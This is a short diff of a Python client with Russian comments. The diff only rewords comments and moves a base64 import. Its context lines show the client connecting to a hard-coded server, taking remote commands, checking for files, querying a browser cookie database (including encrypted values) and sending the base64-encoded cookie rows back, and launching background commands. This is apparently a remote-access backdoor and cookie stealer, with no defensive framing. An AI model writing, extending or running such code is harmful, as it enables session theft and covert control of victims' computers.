@@ -7,6 +7,7 @@ import re
 import tempfile
 import shutil
 import sqlite3
+import base64
 
 SERVER_IP = "192.168.100.3"  # IP сервера
 SERVER_PORT = 5000
@@ -91,7 +92,7 @@ def main():
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
-                    # Обработка команды проверки файла
+                    # Проверка существования файла
                     if cmd.startswith("test_file_exists:"):
                         path = cmd[len("test_file_exists:"):].strip()
                         path = os.path.expanduser(path)
@@ -101,7 +102,7 @@ def main():
                             s.send("NOT_FOUND".encode())
                         continue
 
-                    # Выполнение sqlite3 запроса к базе куков, поле encrypted_value (бинарные данные в sqlite)
+                    # Запрос sqlite3 к файлу куков
                     if cmd.startswith("sqlite3_query:"):
                         try:
                             payload = cmd[len("sqlite3_query:"):].strip()
@@ -123,7 +124,6 @@ def main():
                             if not rows:
                                 s.send("NO_RESULTS".encode())
                             else:
-                                import base64
                                 lines = []
                                 for row in rows:
                                     host = str(row[0])
@@ -139,7 +139,7 @@ def main():
                             s.send(f"ERROR: {e}".encode())
                         continue
 
-                    # Фоновые команды через setsid
+                    # Запуски фоновых команд через setsid
                     if "nohup" in cmd or cmd.endswith('&'):
                         try:
                             m = re.search(r'python3\s+"([^"]+)"', cmd)
